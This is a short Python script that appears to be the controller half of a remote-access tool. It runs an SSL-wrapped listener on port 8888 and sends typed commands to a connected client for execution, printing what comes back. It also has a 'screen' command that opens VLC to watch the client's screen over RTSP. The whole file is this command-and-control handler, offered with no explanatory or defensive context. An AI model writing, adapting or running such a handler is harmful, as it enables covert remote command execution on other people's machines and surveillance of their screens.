import socket
import ssl
import os

def handle_client(client_socket):
    """Function to handle client communication."""
    try:
        while True:
            command = input("Enter command: ")
            if command.lower() == "exit":
                client_socket.send(b"exit")
                break
            elif command.lower() == "screen":
                client_socket.send(b"screen")
                print("[INFO] Opening VLC to view client screen...")
                
                # Replace 'client-ip' with the actual IP of the client
                os.system("vlc rtsp://client-ip:9999")
            else:
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(f"Output: {response}")
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

def start_server(host, port):
    """Function to start the server securely and listen for connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server = ssl.wrap_socket(server, keyfile="key.pem", certfile="cert.pem", server_side=True)
    server.bind((host, port))
    server.listen(5)
    print(f"Secure server listening on {host}:{port}...")

    client_socket, client_address = server.accept()
    print(f"Secure connection established with {client_address}")
    handle_client(client_socket)

if __name__ == "__main__":
    start_server("0.0.0.0", 8888)
